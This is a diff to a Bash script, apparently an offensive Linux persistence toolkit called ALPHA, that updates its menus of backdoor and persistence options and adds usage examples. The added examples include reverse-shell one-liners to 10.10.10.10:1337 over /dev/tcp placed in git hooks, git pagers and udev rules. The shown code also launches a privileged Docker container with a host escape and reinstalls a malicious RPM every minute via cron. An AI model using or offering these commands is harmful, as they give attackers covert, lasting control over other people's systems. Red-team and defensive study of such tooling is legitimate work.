@@ -34,48 +34,49 @@ usage_user() {
 	echo ""
 	echo "Low Privileged User Options:"
 	echo ""
+	echo "  --at                  At job persistence"
+	echo "  --authorized-keys     Add public key to authorized keys"
+	echo "  --bind-shell          Execute backgrounded bind shell"
 	echo "  --cron                Cron job persistence"
+	echo "  --docker-container    Malicious Docker container with host escape (requires docker group permissions)"
+	echo "  --git                 Git persistence"
+	echo "  --shell-profile       Shell profile persistence"
 	echo "  --ssh-key             SSH key persistence"
 	echo "  --systemd             Systemd service persistence"
-	echo "  --at                  At job persistence"
-	echo "  --shell-profile       Shell profile persistence"
 	echo "  --xdg                 XDG autostart persistence"
-	echo "  --authorized-keys     Authorized keys management"
-	echo "  --bind-shell          Setup a bind shell"
-	echo "  --git                 Setup Git persistence"
-	echo "  --revert              Revert most changes made by ALPHA"
+	echo "  --revert              Revert most changes made by ALPHA's default options"
 	echo "  --quiet (-q)          Quiet mode (no banner)"
 }
 
 usage_root() {
 	echo "Root User Options:"
 	echo ""
-	echo "  --cron                Cron job persistence"
-	echo "  --ssh-key             SSH key persistence"
-	echo "  --systemd             Systemd service persistence"
-	echo "  --generator           Set up generator persistence"
 	echo "  --at                  At job persistence"
-	echo "  --shell-profile       Shell profile persistence"
-	echo "  --xdg                 XDG autostart persistence"
-	echo "  --authorized-keys     Authorized keys management"
+	echo "  --authorized-keys     Add public key to authorized keys"
+	echo "  --backdoor-user       Create backdoor user"
+	echo "  --bind-shell          Execute backgrounded bind shell"
+	echo "  --cap                 Add capabilities persistence"
 	echo "  --create-user         Create a new user"
-	echo "  --backdoor-user       Set up a backdoor user"
+	echo "  --cron                Cron job persistence"
+	echo "  --docker-container    Set up a malicious Docker container with root host escape"
+	echo "  --generator           Generator persistence"
+	echo "  --git                 Git persistence"
+	echo "  --initd               SysV Init (init.d) persistence"
+	echo "  --malicious-package   Build and Install a malicious package for persistence (DNF/RPM)"
+	echo "  --motd                Message Of The Day (MOTD) persistence (not available on RHEL derivatives)"
+	echo "  --package-manager     Package Manager persistence (APT/YUM/DNF)"
+	echo "  --passwd-user         Add user to /etc/passwd"
 	echo "  --password-change     Change user password"
-	echo "  --passwd-user         Add user to /etc/passwd with specified settings"
-	echo "  --sudoers             Set up sudoers backdoor"
-	echo "  --suid                Set up SUID backdoor"
-	echo "  --cap                 Set up capabilities backdoor"
-	echo "  --motd                Set up MOTD backdoor (not available on RHEL derivatives)"
-	echo "  --rc-local            Set up rc.local backdoor"
-	echo "  --initd               Set up init.d backdoor"
-	echo "  --package-manager     Set up Package Manager persistence"
-	echo "  --bind-shell          Set up a bind shell"
-	echo "  --system-binary       Set up a system binary backdoor"
-	echo "  --udev                Cron job persistence"
-	echo "  --git                 Setup Git persistence"
-	echo "  --docker-container    Set up a malicious Docker container"
-	echo "  --malicious-package   Set up a malicious package"
-	echo "  --revert		      Revert most changes made by ALPHA"
+	echo "  --rc-local            Run Control (rc.local) persistence"
+	echo "  --shell-profile       Shell profile persistence"
+	echo "  --ssh-key             SSH key persistence"
+	echo "  --sudoers             Sudoers persistence"
+	echo "  --suid                SUID persistence"
+	echo "  --system-binary       System binary persistence"
+	echo "  --systemd             Systemd service persistence"
+	echo "  --udev                Udev (driver) persistence"
+	echo "  --xdg                 XDG autostart persistence"
+	echo "  --revert              Revert most changes made by ALPHA's default options"
 	echo "  --quiet (-q)          Quiet mode (no banner)"
 	echo ""
 }
@@ -2075,6 +2076,7 @@ setup_package_manager_persistence() {
 			echo "[+] DNF persistence established"
 			;;
 	esac
+	echo "[+] Package manager persistence established!"
 }
 
 setup_cap_backdoor() {
@@ -2090,6 +2092,7 @@ setup_cap_backdoor() {
 
 	usage_cap_backdoor() {
 		echo "Usage: ./alpha.sh --cap [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default capabilities settings"
 		echo "--custom                     Use custom capabilities settings"
 		echo "  --capability <capability>   Specify the capability"
@@ -2111,6 +2114,15 @@ setup_cap_backdoor() {
 			--binary )
 				shift
 				binary=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./alpha.sh --cap --default"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --cap --custom --capability \"cap_setuid+ep\" --binary \"/bin/find\""
+				exit 0
 				;;
 			--help|-h)
 				usage_cap_backdoor
@@ -2174,6 +2186,7 @@ setup_cap_backdoor() {
 			echo "[-] $binary is not present on the system."
 		fi
 	fi
+	echo "[+] Capabilities backdoor persistence established!"
 }
 
 setup_bind_shell() {
@@ -2184,6 +2197,7 @@ setup_bind_shell() {
 
 	usage_bind_shell() {
 		echo "Usage: ./alpha.sh --bind-shell [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default bind shell settings"
 		echo "  --architecture <arch>        Specify architecture (x86 or x64)"
 		echo "--custom                     Use custom bind shell binary"
@@ -2205,6 +2219,15 @@ setup_bind_shell() {
 			--binary )
 				shift
 				binary=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./alpha.sh --bind-shell --default --architecture x86"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --bind-shell --custom --binary \"/tmp/bindshell\""
+				exit 0
 				;;
 			--help|-h)
 				usage_bind_shell
@@ -2268,13 +2291,14 @@ setup_bind_shell() {
 
 		chmod +x $binary
 		$binary &
-		echo "[+] Custom binary $binary granted execution privileges and executed in the background."
+		echo "[+] Custom binary $binary is executed and running in the background."
 
 	else
 		echo "Error: Either --default or --custom must be specified for --bind-shell."
 		echo "Try './alpha.sh --bind-shell --help' for more information."
 		exit 1
 	fi
+	echo "[+] Bind shell persistence established!"
 }
 
 setup_system_binary_backdoor() {
@@ -2293,6 +2317,7 @@ setup_system_binary_backdoor() {
 
 	usage_system_binary_backdoor() {
 		echo "Usage: ./alpha.sh --system-binary [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default system binary backdoor settings"
 		echo "  --ip <ip>                    Specify IP address"
 		echo "  --port <port>                Specify port number"
@@ -2328,6 +2353,15 @@ setup_system_binary_backdoor() {
 			--command )
 				shift
 				command=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./alpha.sh --system-binary --default --ip 10.10.10.10 --port 1337"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --system-binary --custom --binary \"/bin/cat\" --command \"/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337'\" --warning"
+				exit 0
 				;;
 			--help|-h)
 				usage_system_binary_backdoor
@@ -2417,6 +2451,7 @@ setup_udev() {
 
 	usage_udev() {
 		echo "Usage: ./alpha.sh --udev [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default udev settings"
 		echo "  --ip <ip>                    Specify IP address"
 		echo "  --port <port>                Specify port number"
@@ -2452,6 +2487,16 @@ setup_udev() {
 			--path )
 				shift
 				path="$1"
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./alpha.sh --udev --default --ip 10.10.10.10 --port 1337 --at|--cron|--systemd"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --udev --custom --command 'SUBSYSTEM==\"net\", KERNEL!=\"lo\", RUN+=\"/usr/bin/at -M -f /tmp/payload now\"' --path \"/etc/udev/rules.d/10-backdoor.rules\""
+				echo "echo -e '#!/bin/sh\nnohup setsid bash -c \"bash -i >& /dev/tcp/10.10.10.10/1337 0>&1\" &' > /tmp/payload && chmod +x /tmp/payload && udevadm control --reload"
+				exit 0
 				;;
 			--help|-h)
 				usage_udev
@@ -2573,6 +2618,7 @@ setup_git_persistence() {
 
 	usage_git() {
 		echo "Usage: ./alpha.sh --git [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default bind shell settings"
 		echo "  --ip <ip>                    Specify IP address"
 		echo "  --port <port>                Specify port number"
@@ -2614,6 +2660,17 @@ setup_git_persistence() {
 			--command )
 				shift
 				command=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "./alpha.sh --git --default --ip 10.10.10.10 --port 1337 --hook|--pager"
+				echo ""
+				echo "--custom:"
+				echo "./alpha.sh --git --custom --command \"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &) &\" --path \"gitdir/.git/hooks/pre-commit\" --hook"
+				echo ""
+				echo "./alpha.sh --git --custom --command \"nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & \${PAGER:-less}\" --path \"~/.gitconfig --pager\""
+				exit 0
 				;;
 			--help|-h)
 				usage_git
@@ -2775,6 +2832,7 @@ setup_git_persistence() {
 			add_custom_pager
 		fi
 	fi
+	echo "[+] Git persistence established!"
 }
 
 setup_malicious_docker_container() {
@@ -2788,6 +2846,7 @@ setup_malicious_docker_container() {
 
 	usage_malicious_docker_container() {
 		echo "Usage: ./alpha.sh --docker-container [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--ip <ip>                    Specify IP address"
 		echo "--port <port>                Specify port number"
 	}
@@ -2804,6 +2863,11 @@ setup_malicious_docker_container() {
 				;;
 			--help|-h)
 				usage_malicious_docker_container
+				exit 0
+				;;
+			--examples )
+				echo "Examples:"
+				echo "./alpha.sh --docker-container --default --ip 10.10.10.10 --port 1337"
 				exit 0
 				;;
 			* )
@@ -2852,8 +2916,10 @@ setup_malicious_docker_container() {
 	docker build -t malicious-container -f $DOCKERFILE . && \
 	docker run -d --name malicious-container --privileged --pid=host malicious-container
 
-	echo "[+] Persistence through malicious Docker container complete."
+	echo "[+] Malicious Docker container created and running."
+	echo "[+] Reverse shell is executed every minute."
 	echo "[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'."
+	echo "[+] Docker container persistence established!" 
 }
 
 setup_malicious_package() {
@@ -2870,10 +2936,11 @@ setup_malicious_package() {
 
 	usage_malicious_package() {
 		echo "Usage: ./setup.sh --malicious-package [OPTIONS]"
-		echo "  --ip <ip>             Specify IP address"
-		echo "  --port <port>         Specify port number"
-		echo "  --rpm                 Use RPM package manager"
-		echo "  --dpkg                Use DPKG package manager"
+		echo "--examples            Display command examples"
+		echo "--ip <ip>             Specify IP address"
+		echo "--port <port>         Specify port number"
+		echo "--rpm                 Use RPM package manager"
+		echo "--dpkg                Use DPKG package manager"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -2891,6 +2958,11 @@ setup_malicious_package() {
 				;;
 			--dpkg )
 				mechanism="$1"
+				;;
+			--examples )
+				echo "Example:"
+				echo "sudo ./alpha.sh --malicious-package --ip 10.10.10.10 --port 1337 --rpm | --dpkg"
+				exit 0
 				;;
 			--help | -h )
 				usage_malicious_package
@@ -2967,8 +3039,9 @@ setup_malicious_package() {
 			rpmbuild -bb ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec
 
 			# Install RPM package with forced overwrite
-			rpm -i --force ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el9.x86_64.rpm
-			mv ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el9.x86_64.rpm /var/lib/rpm/${PACKAGE_NAME}.rpm
+			VER=$(grep VERSION_ID /etc/os-release | cut -d '"' -f 2 | cut -d '.' -f 1)
+			rpm -i --force ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm
+			mv ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm /var/lib/rpm/${PACKAGE_NAME}.rpm
 			rm -rf /root/rpmbuild
 			# Add crontab entry for the current user
 			echo "*/1 * * * * rpm -i --force /var/lib/rpm/${PACKAGE_NAME}.rpm > /dev/null 2>&1" | crontab -
@@ -3018,6 +3091,7 @@ setup_malicious_package() {
 			exit 1
 			;;
 	esac
+	echo "[+] Malicious package persistence established."
 }
 
 revert_changes() {
